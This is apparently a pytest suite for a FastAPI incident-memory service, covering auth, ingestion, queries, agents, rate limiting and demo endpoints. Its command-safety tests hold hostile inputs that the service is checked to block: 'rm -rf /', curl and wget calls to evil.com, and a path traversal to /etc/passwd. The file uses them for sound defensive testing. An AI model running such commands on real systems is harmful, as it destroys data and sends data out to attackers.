import os
import json
import pytest
from unittest.mock import patch, AsyncMock, MagicMock
from fastapi.testclient import TestClient
from app.main import app

client = TestClient(app)

TEST_API_KEY = "test_secret_key"


@pytest.fixture(autouse=True)
def setup_env():
    os.environ["COGNEE_API_KEY"] = TEST_API_KEY
    yield
    if "COGNEE_API_KEY" in os.environ:
        del os.environ["COGNEE_API_KEY"]


def _auth_headers():
    return {"X-API-Key": TEST_API_KEY}


# ─────────────────────────────────────────────────────────
# AUTH TESTS
# ─────────────────────────────────────────────────────────

class TestAuthentication:
    def test_missing_api_key_returns_401(self):
        response = client.post("/ingest", json={"text": "test"})
        assert response.status_code == 401
        assert response.json()["detail"] == "Missing API Key"

    def test_invalid_api_key_returns_403(self):
        headers = {"X-API-Key": "wrong_key"}
        response = client.post("/ingest", json={"text": "test"}, headers=headers)
        assert response.status_code == 403
        assert response.json()["detail"] == "Invalid API Key"

    def test_valid_api_key_passes_auth(self):
        headers = _auth_headers()
        response = client.get("/health", headers=headers)
        assert response.status_code == 200

    def test_auth_required_on_all_endpoints(self):
        protected_endpoints = [
            ("POST", "/ingest", {"text": "test"}),
            ("POST", "/query", {"query": "test", "search_type": "VECTOR_SEARCH"}),
            ("POST", "/mitigate/execute", {"command": "echo ok"}),
            ("POST", "/feedback", {"session_id": "s1", "score": 5, "comment": "good"}),
            ("GET", "/graph", None),
            ("GET", "/health", None),
            ("GET", "/health/decay", None),
            ("GET", "/health/growth", None),
            ("GET", "/health/improve-runs", None),
            ("POST", "/improve", {"dataset": "incidents"}),
            ("POST", "/agents/register", {"name": "test_agent"}),
            ("POST", "/agents/session", {"agent_session_name": "a1", "session_id": "s1"}),
            ("DELETE", "/prune", None),
            ("GET", "/provenance", None),
            ("GET", "/schema", None),
            ("POST", "/summarize", {"text": "test incident"}),
            ("PUT", "/update", {"data_id": "id1", "new_data": "updated"}),
            ("POST", "/export", {"dataset": "incidents"}),
            ("POST", "/push", {"data": "test", "target_dataset": "archive"}),
            ("GET", "/observability/traces", None),
            ("DELETE", "/observability/traces", None),
        ]
        for method, path, body in protected_endpoints:
            if method == "POST":
                response = client.post(path, json=body)
            elif method == "DELETE":
                response = client.delete(path)
            elif method == "PUT":
                response = client.put(path, json=body)
            else:
                response = client.get(path)
            assert response.status_code == 401, f"Auth bypass on {method} {path}"


# ─────────────────────────────────────────────────────────
# COMMAND SAFETY TESTS
# ─────────────────────────────────────────────────────────

class TestCommandSafety:
    def test_blocks_rm_command(self):
        headers = _auth_headers()
        response = client.post(
            "/mitigate/execute",
            json={"command": "rm -rf /"},
            headers=headers,
        )
        assert response.status_code == 400
        assert "safety policy violation" in response.json()["detail"]

    def test_blocks_curl_command(self):
        headers = _auth_headers()
        response = client.post(
            "/mitigate/execute",
            json={"command": "curl http://evil.com/steal"},
            headers=headers,
        )
        assert response.status_code == 400

    def test_blocks_wget_command(self):
        headers = _auth_headers()
        response = client.post(
            "/mitigate/execute",
            json={"command": "wget http://evil.com/payload"},
            headers=headers,
        )
        assert response.status_code == 400

    def test_blocks_path_traversal(self):
        headers = _auth_headers()
        response = client.post(
            "/mitigate/execute",
            json={"command": "python3 scripts/../../etc/passwd"},
            headers=headers,
        )
        assert response.status_code == 400
        assert "path traversal" in response.json()["detail"].lower()

    def test_allows_echo_command(self):
        headers = _auth_headers()
        response = client.post(
            "/mitigate/execute",
            json={"command": "echo healthy"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "success"
        assert "healthy" in response.json()["stdout"]

    def test_allows_restart_script(self):
        headers = _auth_headers()
        response = client.post(
            "/mitigate/execute",
            json={"command": "python3 scripts/restart_service.py billing-db"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "success"
        assert "billing-db" in response.json()["stdout"]

    def test_restart_script_missing_arg(self):
        headers = _auth_headers()
        response = client.post(
            "/mitigate/execute",
            json={"command": "python3 scripts/restart_service.py"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["exit_code"] == 1


# ─────────────────────────────────────────────────────────
# INGESTION TESTS (REMEMBER)
# ─────────────────────────────────────────────────────────

class TestIngestion:
    @patch("app.main.add_incident_report", new_callable=AsyncMock)
    def test_ingest_success(self, mock_add):
        mock_add.return_value = {"status": "remembered", "dataset": "incidents"}
        headers = _auth_headers()
        response = client.post(
            "/ingest",
            json={"text": "Auth service OOM at 3am. Root cause: memory leak in token validation."},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "success"
        mock_add.assert_called_once()

    @patch("app.main.add_incident_report", new_callable=AsyncMock)
    def test_ingest_with_nodeset(self, mock_add):
        mock_add.return_value = {"status": "remembered", "node_set": ["team-infra", "service-auth"]}
        headers = _auth_headers()
        response = client.post(
            "/ingest",
            json={"text": "Test incident", "node_set": ["team-infra", "service-auth"]},
            headers=headers,
        )
        assert response.status_code == 200
        call_kwargs = mock_add.call_args
        assert call_kwargs.kwargs.get("node_set") == ["team-infra", "service-auth"]

    @patch("app.main.add_incident_report", new_callable=AsyncMock)
    def test_ingest_with_custom_prompt(self, mock_add):
        mock_add.return_value = {"status": "remembered"}
        headers = _auth_headers()
        response = client.post(
            "/ingest",
            json={"text": "Test incident", "custom_prompt": "Extract all P0 incidents only"},
            headers=headers,
        )
        assert response.status_code == 200
        call_kwargs = mock_add.call_args
        assert call_kwargs.kwargs.get("custom_prompt") == "Extract all P0 incidents only"

    @patch("app.main.add_incident_report", new_callable=AsyncMock)
    def test_ingest_custom_dataset(self, mock_add):
        mock_add.return_value = {"status": "remembered", "dataset": "payments-incidents"}
        headers = _auth_headers()
        response = client.post(
            "/ingest",
            json={"text": "Test incident", "dataset": "payments-incidents"},
            headers=headers,
        )
        assert response.status_code == 200
        mock_add.assert_called_once()

    def test_ingest_text_too_large(self):
        headers = _auth_headers()
        huge_text = "x" * 100001
        response = client.post(
            "/ingest",
            json={"text": huge_text},
            headers=headers,
        )
        assert response.status_code == 413

    @patch("app.main.add_incident_report", new_callable=AsyncMock, side_effect=Exception("cognee failure"))
    def test_ingest_backend_error_returns_500(self, mock_add):
        headers = _auth_headers()
        response = client.post(
            "/ingest",
            json={"text": "test"},
            headers=headers,
        )
        assert response.status_code == 500


# ─────────────────────────────────────────────────────────
# QUERY TESTS (RECALL)
# ─────────────────────────────────────────────────────────

class TestQuery:
    @patch("app.main.search_memory", new_callable=AsyncMock)
    def test_query_vector_search(self, mock_search):
        mock_search.return_value = {"results": ["result1"], "traces": [], "search_type": "VECTOR_SEARCH"}
        headers = _auth_headers()
        response = client.post(
            "/query",
            json={"query": "What caused the auth outage?", "search_type": "VECTOR_SEARCH"},
            headers=headers,
        )
        assert response.status_code == 200
        data = response.json()
        assert "results" in data
        assert "mitigation_proposal" in data

    @patch("app.main.search_memory", new_callable=AsyncMock)
    def test_query_graph_completion(self, mock_search):
        mock_search.return_value = {"results": ["graph result"], "traces": [], "search_type": "GRAPH_COMPLETION"}
        headers = _auth_headers()
        response = client.post(
            "/query",
            json={"query": "Blast radius if auth goes down", "search_type": "GRAPH_COMPLETION"},
            headers=headers,
        )
        assert response.status_code == 200

    @patch("app.main.search_memory", new_callable=AsyncMock)
    def test_query_temporal(self, mock_search):
        mock_search.return_value = {"results": ["temporal result"], "traces": [], "search_type": "TEMPORAL"}
        headers = _auth_headers()
        response = client.post(
            "/query",
            json={"query": "Incidents in January", "search_type": "TEMPORAL"},
            headers=headers,
        )
        assert response.status_code == 200

    @patch("app.main.search_memory", new_callable=AsyncMock, side_effect=Exception("search failed"))
    def test_query_error_returns_500(self, mock_search):
        headers = _auth_headers()
        response = client.post(
            "/query",
            json={"query": "test", "search_type": "VECTOR_SEARCH"},
            headers=headers,
        )
        assert response.status_code == 500


# ─────────────────────────────────────────────────────────
# GRAPH ENDPOINT TESTS
# ─────────────────────────────────────────────────────────

class TestGraph:
    @patch("app.main.get_authorized_existing_datasets", new_callable=AsyncMock)
    @patch("app.main.get_default_user", new_callable=AsyncMock)
    def test_graph_empty_when_no_datasets(self, mock_user, mock_datasets):
        mock_user.return_value = MagicMock(id="user1")
        mock_datasets.return_value = []
        headers = _auth_headers()
        response = client.get("/graph", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert data["nodes"] == []
        assert data["links"] == []


# ─────────────────────────────────────────────────────────
# HEALTH ENDPOINTS TESTS
# ─────────────────────────────────────────────────────────

class TestHealth:
    @patch("app.main.get_memory_health_stats", new_callable=AsyncMock)
    def test_health_stats(self, mock_stats):
        mock_stats.return_value = {
            "dataset": "incidents",
            "graph": {"total_nodes": 42, "total_edges": 68, "node_type_breakdown": {"Service": 10}},
            "memory_health": "healthy",
            "decay": {"decay_percentage": 5.0, "stale_node_count": 2, "total_node_count": 42},
        }
        headers = _auth_headers()
        response = client.get("/health", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert data["memory_health"] == "healthy"
        assert data["graph"]["total_nodes"] == 42

    @patch("app.main.get_knowledge_decay", new_callable=AsyncMock)
    def test_decay_stats(self, mock_decay):
        mock_decay.return_value = {
            "dataset": "incidents",
            "decay_percentage": 12.5,
            "total_nodes": 100,
            "stale_nodes": 12,
            "healthy_nodes": 88,
        }
        headers = _auth_headers()
        response = client.get("/health/decay", headers=headers)
        assert response.status_code == 200
        assert response.json()["decay_percentage"] == 12.5

    @patch("app.main.get_growth_history")
    def test_growth_history(self, mock_growth):
        mock_growth.return_value = [
            {"timestamp": "2024-01-01T00:00:00Z", "dataset": "incidents", "nodes": 10, "edges": 15}
        ]
        headers = _auth_headers()
        response = client.get("/health/growth", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert data["total_snapshots"] == 1

    @patch("app.main.get_improve_history")
    def test_improve_runs_history(self, mock_history):
        mock_history.return_value = [
            {"timestamp": "2024-01-01T00:00:00Z", "dataset": "incidents", "session_ids": ["s1"]}
        ]
        headers = _auth_headers()
        response = client.get("/health/improve-runs", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert data["total_runs"] == 1


# ─────────────────────────────────────────────────────────
# FEEDBACK TESTS
# ─────────────────────────────────────────────────────────

class TestFeedback:
    @patch("app.main.submit_feedback", new_callable=AsyncMock)
    def test_feedback_success(self, mock_submit):
        mock_submit.return_value = True
        headers = _auth_headers()
        response = client.post(
            "/feedback",
            json={"session_id": "test_session", "score": 5, "comment": "Great answer"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "success"

    @patch("app.main.submit_feedback", new_callable=AsyncMock)
    def test_feedback_session_not_found(self, mock_submit):
        mock_submit.return_value = False
        headers = _auth_headers()
        response = client.post(
            "/feedback",
            json={"session_id": "nonexistent", "score": 3, "comment": "ok"},
            headers=headers,
        )
        assert response.status_code == 404


# ─────────────────────────────────────────────────────────
# IMPROVE TESTS
# ─────────────────────────────────────────────────────────

class TestImprove:
    @patch("app.main.improve_memory", new_callable=AsyncMock)
    def test_improve_success(self, mock_improve):
        mock_improve.return_value = {"status": "completed", "dataset": "incidents"}
        headers = _auth_headers()
        response = client.post(
            "/improve",
            json={"dataset": "incidents", "run_in_background": False},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "completed"

    @patch("app.main.improve_memory", new_callable=AsyncMock, side_effect=Exception("improve failed"))
    def test_improve_error_returns_500(self, mock_improve):
        headers = _auth_headers()
        response = client.post(
            "/improve",
            json={"dataset": "incidents"},
            headers=headers,
        )
        assert response.status_code == 500


# ─────────────────────────────────────────────────────────
# AGENT TESTS
# ─────────────────────────────────────────────────────────

class TestAgents:
    @patch("app.main.register_engineer_agent", new_callable=AsyncMock)
    def test_register_agent(self, mock_register):
        mock_register.return_value = {"id": "agent1", "name": "on_call_sre"}
        headers = _auth_headers()
        response = client.post(
            "/agents/register",
            json={"name": "on_call_sre", "datasets": ["incidents"]},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["agent_info"]["name"] == "on_call_sre"

    @patch("app.main.register_agent_session", new_callable=AsyncMock)
    def test_register_agent_session(self, mock_register):
        mock_register.return_value = {"agent": "a1", "session": "s1"}
        headers = _auth_headers()
        response = client.post(
            "/agents/session",
            json={
                "agent_session_name": "on_call_sre",
                "session_id": "session_123",
                "datasets": ["incidents"],
            },
            headers=headers,
        )
        assert response.status_code == 200

    @patch("app.main.on_call_sre_agent", new_callable=AsyncMock)
    def test_invoke_sre_agent(self, mock_invoke):
        mock_invoke.return_value = {
            "similar_incidents": ["INC-101"],
            "likely_failure_modes": ["Timeout"],
            "recommended_mitigations": ["Scale up"],
        }
        headers = _auth_headers()
        response = client.post(
            "/agents/invoke/sre",
            json={"incident_text": "High latency observed"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "success"
        assert response.json()["agent"] == "on_call_sre"

    @patch("app.main.post_mortem_analyzer_agent", new_callable=AsyncMock)
    def test_invoke_postmortem_agent(self, mock_invoke):
        mock_invoke.return_value = {
            "root_cause": "Memory leak",
            "severity": "High",
            "affected_services": ["auth"],
            "failure_modes": ["OOM"],
            "mitigations": ["Restart"],
            "recommendations": ["Fix leak"],
            "similar_past_incidents": [],
        }
        headers = _auth_headers()
        response = client.post(
            "/agents/invoke/postmortem",
            json={"incident_text": "System crash due to OOM"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "success"
        assert response.json()["agent"] == "post_mortem_analyzer"


# ─────────────────────────────────────────────────────────
# PRUNE / FORGET TESTS
# ─────────────────────────────────────────────────────────

class TestPrune:
    @patch("app.main.forget_memory", new_callable=AsyncMock)
    def test_prune_dataset(self, mock_forget):
        mock_forget.return_value = {"status": "forgotten"}
        headers = _auth_headers()
        response = client.delete("/prune?dataset=incidents", headers=headers)
        assert response.status_code == 200
        assert response.json()["status"] == "success"

    @patch("app.main.forget_memory", new_callable=AsyncMock)
    def test_prune_entity(self, mock_forget):
        mock_forget.return_value = {"status": "forgotten"}
        headers = _auth_headers()
        response = client.delete(
            "/prune?dataset=incidents&entity_id=node_123",
            headers=headers,
        )
        assert response.status_code == 200


# ─────────────────────────────────────────────────────────
# LINEAGE TESTS
# ─────────────────────────────────────────────────────────

class TestLineage:
    @patch("app.main.get_node_lineage", new_callable=AsyncMock)
    def test_lineage_success(self, mock_lineage):
        mock_lineage.return_value = {
            "node_id": "node_123",
            "name": "auth-service",
            "type": "Service",
            "lineage": {
                "document_id": "doc_abc",
                "ingested_at": "2024-01-15T10:30:00Z",
                "ontology_valid": True,
            },
        }
        headers = _auth_headers()
        response = client.get("/lineage/node_123", headers=headers)
        assert response.status_code == 200
        assert response.json()["name"] == "auth-service"

    @patch("app.main.get_node_lineage", new_callable=AsyncMock)
    def test_lineage_not_found(self, mock_lineage):
        mock_lineage.return_value = {"node_id": "nonexistent", "error": "Node not found"}
        headers = _auth_headers()
        response = client.get("/lineage/nonexistent", headers=headers)
        assert response.status_code == 404


# ─────────────────────────────────────────────────────────
# PROVENANCE TESTS
# ─────────────────────────────────────────────────────────

class TestProvenance:
    @patch("app.main.get_provenance_graph", new_callable=AsyncMock)
    def test_provenance_success(self, mock_prov):
        mock_prov.return_value = {
            "dataset": "incidents",
            "provenance_nodes": 5,
            "provenance_graph": [{"id": "p1", "type": "ingestion", "source": "doc1"}],
        }
        headers = _auth_headers()
        response = client.get("/provenance", headers=headers)
        assert response.status_code == 200
        assert response.json()["provenance_nodes"] == 5

    @patch("app.main.get_provenance_graph", new_callable=AsyncMock)
    def test_provenance_error_returns_data(self, mock_prov):
        mock_prov.return_value = {"dataset": "incidents", "error": "not found", "provenance_nodes": 0, "provenance_graph": []}
        headers = _auth_headers()
        response = client.get("/provenance", headers=headers)
        assert response.status_code == 200
        assert response.json()["provenance_nodes"] == 0


# ─────────────────────────────────────────────────────────
# SCHEMA INVENTORY TESTS
# ─────────────────────────────────────────────────────────

class TestSchemaInventory:
    @patch("app.main.get_schema_inventory", new_callable=AsyncMock)
    def test_schema_success(self, mock_schema):
        mock_schema.return_value = {
            "total_schemas": 9,
            "schemas": [
                {"name": "Incident", "type": "DataPoint", "properties": ["title", "severity"]},
                {"name": "Service", "type": "DataPoint", "properties": ["name", "team"]},
            ],
        }
        headers = _auth_headers()
        response = client.get("/schema", headers=headers)
        assert response.status_code == 200
        assert response.json()["total_schemas"] == 9


# ─────────────────────────────────────────────────────────
# SUMMARIZATION TESTS
# ─────────────────────────────────────────────────────────

class TestSummarization:
    @patch("app.main.summarize_incident", new_callable=AsyncMock)
    def test_summarize_success(self, mock_sum):
        mock_sum.return_value = {
            "status": "summarized",
            "incident_title": "Auth OOM",
            "summary": "Auth service crashed due to memory leak.",
        }
        headers = _auth_headers()
        response = client.post(
            "/summarize",
            json={"text": "Auth service OOM at 3am...", "incident_title": "Auth OOM"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "summarized"

    @patch("app.main.summarize_incident", new_callable=AsyncMock)
    def test_summarize_fallback(self, mock_sum):
        mock_sum.return_value = {
            "status": "fallback_summary",
            "incident_title": "Auth OOM",
            "summary": "Auth service...",
            "error": "LLM unavailable",
        }
        headers = _auth_headers()
        response = client.post(
            "/summarize",
            json={"text": "Auth service...", "incident_title": "Auth OOM"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "fallback_summary"


# ─────────────────────────────────────────────────────────
# UPDATE MEMORY TESTS
# ─────────────────────────────────────────────────────────

class TestUpdateMemory:
    @patch("app.main.update_memory", new_callable=AsyncMock)
    def test_update_success(self, mock_update):
        mock_update.return_value = {"status": "updated", "data_id": "id1", "dataset": "incidents"}
        headers = _auth_headers()
        response = client.put(
            "/update",
            json={"data_id": "id1", "new_data": "Updated incident details"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "updated"

    @patch("app.main.update_memory", new_callable=AsyncMock)
    def test_update_error(self, mock_update):
        mock_update.return_value = {"status": "error", "data_id": "bad_id", "error": "not found"}
        headers = _auth_headers()
        response = client.put(
            "/update",
            json={"data_id": "bad_id", "new_data": "test"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "error"


# ─────────────────────────────────────────────────────────
# EXPORT TESTS
# ─────────────────────────────────────────────────────────

class TestExport:
    @patch("app.main.export_memory", new_callable=AsyncMock)
    def test_export_success(self, mock_export):
        mock_export.return_value = {
            "status": "exported",
            "dataset": "incidents",
            "format": "json",
            "data": {"nodes": 10, "edges": 15},
        }
        headers = _auth_headers()
        response = client.post(
            "/export",
            json={"dataset": "incidents", "format": "json"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "exported"

    @patch("app.main.export_memory", new_callable=AsyncMock)
    def test_export_error(self, mock_export):
        mock_export.return_value = {"status": "error", "dataset": "incidents", "error": "empty dataset"}
        headers = _auth_headers()
        response = client.post(
            "/export",
            json={"dataset": "empty", "format": "json"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "error"


# ─────────────────────────────────────────────────────────
# PUSH TESTS
# ─────────────────────────────────────────────────────────

class TestPush:
    @patch("app.main.push_memory", new_callable=AsyncMock)
    def test_push_success(self, mock_push):
        mock_push.return_value = {
            "status": "pushed",
            "source": "incidents",
            "target": "archive",
        }
        headers = _auth_headers()
        response = client.post(
            "/push",
            json={"data": "incident data", "target_dataset": "archive"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "pushed"

    @patch("app.main.push_memory", new_callable=AsyncMock)
    def test_push_error(self, mock_push):
        mock_push.return_value = {"status": "error", "error": "connection failed"}
        headers = _auth_headers()
        response = client.post(
            "/push",
            json={"data": "test", "target_dataset": "unreachable"},
            headers=headers,
        )
        assert response.status_code == 200
        assert response.json()["status"] == "error"


# ─────────────────────────────────────────────────────────
# OBSERVABILITY TESTS
# ─────────────────────────────────────────────────────────

class TestObservability:
    @patch("app.main.get_observability_traces", new_callable=AsyncMock)
    def test_get_traces(self, mock_traces):
        mock_traces.return_value = {
            "total_traces": 3,
            "traces": [{"name": "recall", "start_time": "2024-01-01T00:00:00Z"}],
        }
        headers = _auth_headers()
        response = client.get("/observability/traces", headers=headers)
        assert response.status_code == 200
        assert response.json()["total_traces"] == 3

    @patch("app.main.clear_observability_traces", new_callable=AsyncMock)
    def test_clear_traces(self, mock_clear):
        mock_clear.return_value = {"status": "cleared", "message": "All observability traces cleared"}
        headers = _auth_headers()
        response = client.delete("/observability/traces", headers=headers)
        assert response.status_code == 200
        assert response.json()["status"] == "cleared"


# ─────────────────────────────────────────────────────────
# RATE LIMITING TESTS
# ─────────────────────────────────────────────────────────

class TestRateLimiting:
    def test_rate_limit_enforced(self):
        from app.main import _request_log
        _request_log.clear()
        headers = _auth_headers()
        for _ in range(110):
            client.get("/health", headers=headers)
        response = client.get("/health", headers=headers)
        assert response.status_code == 429


# ─────────────────────────────────────────────────────────
# MODEL VALIDATION TESTS
# ─────────────────────────────────────────────────────────

class TestModelValidation:
    def test_ingest_missing_text(self):
        from app.main import _request_log
        _request_log.clear()
        headers = _auth_headers()
        response = client.post("/ingest", json={}, headers=headers)
        assert response.status_code == 422

    def test_query_missing_fields(self):
        from app.main import _request_log
        _request_log.clear()
        headers = _auth_headers()
        response = client.post("/query", json={}, headers=headers)
        assert response.status_code == 422

    def test_feedback_missing_fields(self):
        from app.main import _request_log
        _request_log.clear()
        headers = _auth_headers()
        response = client.post("/feedback", json={}, headers=headers)
        assert response.status_code == 422

    def test_summarize_missing_text(self):
        from app.main import _request_log
        _request_log.clear()
        headers = _auth_headers()
        response = client.post("/summarize", json={}, headers=headers)
        assert response.status_code == 422

    def test_update_missing_fields(self):
        from app.main import _request_log
        _request_log.clear()
        headers = _auth_headers()
        response = client.put("/update", json={}, headers=headers)
        assert response.status_code == 422

    def test_export_with_defaults(self):
        from app.main import _request_log
        _request_log.clear()
        headers = _auth_headers()
        with patch("app.main.export_memory", new_callable=AsyncMock) as mock_exp:
            mock_exp.return_value = {"status": "exported", "dataset": "incidents", "format": "json", "data": {}}
            response = client.post("/export", json={}, headers=headers)
            assert response.status_code == 200

    def test_push_missing_fields(self):
        from app.main import _request_log
        _request_log.clear()
        headers = _auth_headers()
        response = client.post("/push", json={}, headers=headers)
        assert response.status_code == 422


# ─────────────────────────────────────────────────────────
# DEMO MODE TESTS
# ─────────────────────────────────────────────────────────

class TestDemoMode:
    @patch("app.main.add_incident_report", new_callable=AsyncMock)
    def test_demo_load(self, mock_add):
        mock_add.return_value = {"status": "remembered", "dataset": "incidents"}
        headers = _auth_headers()
        response = client.post("/demo/load", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "success"
        assert len(data["incidents"]) == 6
        assert mock_add.call_count == 6

    @patch("app.main.add_incident_report", new_callable=AsyncMock, side_effect=Exception("cognee fail"))
    def test_demo_load_error(self, mock_add):
        headers = _auth_headers()
        response = client.post("/demo/load", headers=headers)
        assert response.status_code == 500

    @patch("app.main.search_memory", new_callable=AsyncMock)
    def test_demo_compare(self, mock_search):
        mock_search.return_value = {
            "results": ["Auth OOM incident on Jan 15", "Payment cascade on Feb 18"],
            "traces": [],
        }
        headers = _auth_headers()
        with patch("cognee.infrastructure.llm.LLMGateway.LLMGateway.acreate_structured_output", new_callable=AsyncMock) as mock_llm:
            mock_llm.return_value = "Memory-powered answer"
            response = client.post(
                "/demo/compare",
                json={"question": "What caused auth failures?"},
                headers=headers,
            )
        assert response.status_code == 200
        data = response.json()
        assert "stateless" in data
        assert "cognee_powered" in data
        assert data["cognee_powered"]["has_memory"] is True
        assert data["stateless"]["has_memory"] is False
